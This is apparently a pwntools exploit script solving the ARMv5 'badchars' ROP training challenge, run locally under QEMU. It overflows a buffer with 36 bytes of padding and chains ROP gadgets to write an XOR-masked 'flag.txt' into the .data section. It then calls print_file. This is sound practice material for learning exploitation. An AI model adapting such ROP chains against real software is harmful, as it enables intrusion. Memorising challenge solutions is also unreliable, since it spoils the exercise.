#!/usr/bin/env python3
from pwn import *
import os

os.environ["QEMU_LD_PREFIX"] = "/usr/arm-linux-gnueabihf"

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'badchars_armv5-hf')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./badchars_armv5-hf_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b'A' * 36

# ropper --arch ARM --file badchars_armv5-hf
# 0x000105fc: pop {r0, pc};
# 0x0001066c: push {r3, lr}; pop {r3, pc};
# 0x000105b0: pop {r4, pc};
# 0x00010614: pop {r5, r6, pc};
# 0x00010610: str r3, [r4]; pop {r5, r6, pc};
# 0x00010618: ldr r1, [r5]; eor r1, r1, r6; str r1, [r5]; pop {r0, pc};
POP_R0 = p32(0x105fc)
POP_R3 = p32(0x10670)
POP_R4 = p32(0x105b0)
POP_R5_R6 = p32(0x10614)
STR_MEM = p32(0x10610)
LDR_XOR = p32(0x10618)

# (r2) iS - sections adresses
# 0x00001024    0x8 0x00021024    0x8 -rw- 0x3   PROGBITS    .data
DATA_ADDR = 0x21024

# "flag.txt" string
FLAG_STR = p32(int.from_bytes(b"flag", 'little'))
TXT_STR = p32(int.from_bytes(b".txt", 'little'))

# (r2) aaa; afl
# 0x000104c0    1     12 sym.imp.print_file
PR_FILE = p32(0x104c0)

payload = padding
payload += p32(DATA_ADDR) + p32(0x0) + POP_R3 + FLAG_STR + STR_MEM
payload += p32(DATA_ADDR) + p32(0x8c8a0000)
payload += LDR_XOR + p32(0x0)
payload += POP_R3 + TXT_STR + POP_R4 + p32(DATA_ADDR+4) + STR_MEM
payload += p32(DATA_ADDR+4) + p32(0x009300c5)
payload += LDR_XOR + p32(DATA_ADDR)
payload += PR_FILE

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()
